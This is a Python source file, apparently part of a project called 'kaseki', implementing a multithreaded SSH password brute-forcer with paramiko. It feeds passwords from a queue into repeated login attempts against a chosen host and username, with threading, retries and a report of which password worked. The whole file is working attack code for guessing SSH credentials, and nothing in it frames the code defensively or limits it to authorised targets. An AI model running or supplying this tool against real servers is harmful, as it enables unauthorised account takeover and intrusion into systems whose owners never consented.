import threading
import multiprocessing
from typing import List, Union, Optional, Callable
import paramiko
from termcolor import cprint
import queue

from kaseki.utils import queuecontent

DEFAULT_PORT: int = 22

class SSHLoginThreadInfo:
    """A class for representing a thread's identity and information.

    Attributes:
        thread_id (int): An identifier for the thread, typically an arbitrary number.
        thread_obj (threading.Thread): The associated thread object.
    """

    def __init__(self, thread_id: int, thread_obj: threading.Thread):
        """Initialize SSHLoginThreadInfo with a thread ID and thread object.

        Args:
            thread_id (int): A unique identifier for the thread.
            thread_obj (threading.Thread): The actual thread object.
        """
        self.thread_id: int = thread_id
        self.thread_obj: threading.Thread = thread_obj


class SSHTarget:
    """
    Represents the details of the target SSH server for brute-force attempts.

    Attributes:
        hostname (str): The hostname or IP address of the SSH server.
        port (int): The port number for SSH, defaults to 22.
        username (Optional[str]): The username for SSH login.
        verbose (bool): Controls detailed logging output.
    """

    def __init__(self, hostname: str = "localhost", port: int = DEFAULT_PORT, username: Optional[str] = None, verbose: bool = False):
        """Initialize the SSHTarget with hostname, port, and optional username.

        Args:
            hostname (str): SSH server hostname or IP.
            port (int): Port number for SSH.
            username (Optional[str]): Username for login, if specified.
            verbose (bool): Enable or disable verbose logging.
        """
        self.hostname = hostname
        self.port = port
        self.username = username
        self.verbose = verbose


class SSHBruteForcer:
    """
    A class for handling the brute-force login attempts on an SSH server.

    Attributes:
        passwords_queue (queue.Queue or multiprocessing.Queue): Queue holding passwords to test.
        results_queue (queue.Queue or multiprocessing.Queue): Queue for holding login attempt results.
        target (SSHTarget): SSH target server details.
        login_thread_n (int): Number of login threads to spawn.
        available_login_thread_ids (List[int]): List of available thread IDs for tracking active threads.
        ssh_login_threads_info (List[SSHLoginThreadInfo]): Holds SSH thread info for managing threads.
        stop_flag (bool): Indicates if brute-forcing should be stopped.
        thread_lock (threading.Lock): Lock to ensure thread-safe operations.
    """

    def __init__(
        self, 
        target: SSHTarget, 
        passwords_queue: Union[queue.Queue, multiprocessing.Queue], 
        results_queue: Union[queue.Queue, multiprocessing.Queue],
        login_thread_n: int = 0,
        max_login_retries: int = 100
    ):
        """Initialize the SSHBruteForcer with the target server and configuration.

        Args:
            target (SSHTarget): SSH target details.
            passwords_queue (Queue): Queue for passwords to be brute-forced.
            results_queue (Queue): Queue for storing brute-force results.
            login_thread_n (int): Number of threads for concurrent brute-force attempts.
        """
        self.passwords_queue = passwords_queue
        self.results_queue = results_queue
        self.target = target
        self.login_thread_n = login_thread_n
        self.available_login_thread_ids: List[int] = []
        self.ssh_login_threads_info: List[SSHLoginThreadInfo] = []
        self.stop_flag: bool = False
        self.thread_lock: threading.Lock = threading.Lock()
        self.max_login_retries = max_login_retries

    def _get_bruteforce_method(self) -> Callable[[], None]:
        """Determine whether to use a threaded or non-threaded brute-force method.

        Returns:
            Callable[[], None]: The appropriate brute-force method.
        """
        return self.threaded_bruteforce if self.login_thread_n > 0 else self.nonthreaded_bruteforce

    def run(self) -> None:
        """Run the brute-force method in the current process."""
        self._get_bruteforce_method()()

    def threaded_run(self) -> None:
        """Start the brute-force method as a separate thread."""
        threading.Thread(target=self._get_bruteforce_method()).start()

    def multiprocessed_run(self) -> multiprocessing.Process:
        """Run the brute-force method as a separate process.

        Returns:
            multiprocessing.Process: The created process object.
        """
        bruteforce_proc = multiprocessing.Process(
            target=self._get_bruteforce_method(),
            daemon=True
        )
        bruteforce_proc.start()
        return bruteforce_proc

    def wait_for_login_threads(self) -> None:
        """Wait for all login threads to finish execution."""
        if self.target.verbose:
            cprint(f"[*] Waiting for {threading.active_count()} threads to finish", "magenta", attrs=["bold"])
        for login_thread_info in self.ssh_login_threads_info:
            login_thread_info.thread_obj.join(timeout=5)

    def blocking_get_thread_id(self) -> int:
        """Get an available thread ID, blocking until one becomes available.

        Returns:
            int: An available thread ID.
        """
        while True:
            with self.thread_lock:
                if self.available_login_thread_ids:
                    return self.available_login_thread_ids.pop()

    def get_queue_data(self, block: bool = True) -> queuecontent.QueueData:
        """Fetch data from the passwords queue.

        Args:
            block (bool): Whether to block until data is available.

        Returns:
            queuecontent.QueueData: Data from the queue.
        """
        return self.passwords_queue.get(block=block)

    def stop(self) -> None:
        """Stop the brute-forcing process and wait for all threads to finish."""
        cprint("[*] Stopping bruteforcer", "magenta", attrs=["bold"])
        self.wait_for_login_threads()

    def should_stop(self, signal) -> bool:
        """Determine if brute-forcing should stop based on the provided signal.

        Args:
            signal: Signal indicating status of queue processing.

        Returns:
            bool: True if brute-forcing should stop, False otherwise.
        """
        return signal is queuecontent.Signal.NoPasswordsLeft

    def nonthreaded_bruteforce(self) -> None:
        """Run brute-forcing in the current process without threads."""
        while not self.stop_flag:
            queuedata = self.get_queue_data(block=True)
            if self.should_stop(queuedata.signal):
                break
            self.ssh_login(password=queuedata.content)

        self.broadcast_queuedata_then_stop(queuedata)

    def threaded_bruteforce(self) -> None:
        """Run brute-forcing with multiple threads, limited by login_thread_n."""
        for new_thread_id in range(self.login_thread_n):
            with self.thread_lock:
                self.available_login_thread_ids.append(new_thread_id)

        while not self.stop_flag:
            thread_id = self.blocking_get_thread_id()
            queuedata = self.passwords_queue.get(block=True)

            if self.should_stop(queuedata.signal):
                break

            ssh_login_thread = threading.Thread(
                target=self.ssh_login,
                daemon=True,
                args=(queuedata.content, thread_id, self.max_login_retries)
            )
            ssh_login_thread.start()
            self.ssh_login_threads_info.append(SSHLoginThreadInfo(thread_id, ssh_login_thread))

        self.broadcast_queuedata_then_stop(queuedata)

    def broadcast_queuedata_then_stop(self, queuedata: queuecontent.QueueData) -> None:
        """Notify other brute-forcers to stop and stop this instance."""
        cprint(f"[+] BRUTEFORCE SENDING NoPasswordsLeft TO OTHER BRUTEFORCERS", "yellow", attrs=["bold"])
        self.passwords_queue.put(queuedata)
        self.stop()

    def ssh_login(self, password: str, ssh_thread_id: int = 0, max_tries:int=100) -> None:
        """Attempt SSH login and record result in the results queue.

        Args:
            password (str): Password to attempt.
            ssh_thread_id (int): Thread ID for tracking.
            max_tries (int): Maximum retry attempts.
        """
        tries = 0
        result = queuecontent.QueueData(queuecontent.Signal.Blank, None)
        while not self.stop_flag and tries < max_tries:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    hostname=self.target.hostname,
                    port=self.target.port,
                    username=self.target.username,
                    password=password,
                    timeout=10
                )
                result = queuecontent.QueueData(queuecontent.Signal.Success, password)
                break
            except paramiko.ssh_exception.AuthenticationException:
                result = queuecontent.QueueData(queuecontent.Signal.Failed, password)
                break
            except paramiko.ssh_exception.SSHException:
                tries += 1
                if tries >= max_tries:
                    result = queuecontent.QueueData(queuecontent.Signal.Retry, password)
                    break            
            finally:
                if 'client' in locals():
                    client.close()
                self.results_queue.put(result)

        if self.login_thread_n > 0:
            self.free_ssh_thread(ssh_thread_id)

    def free_ssh_thread(self, ssh_login_thread_id: int) -> None:
        """Release a thread ID, marking it available for reuse.

        Args:
            ssh_login_thread_id (int): The thread ID to release.
        """
        with self.thread_lock:
            self.available_login_thread_ids.append(ssh_login_thread_id)
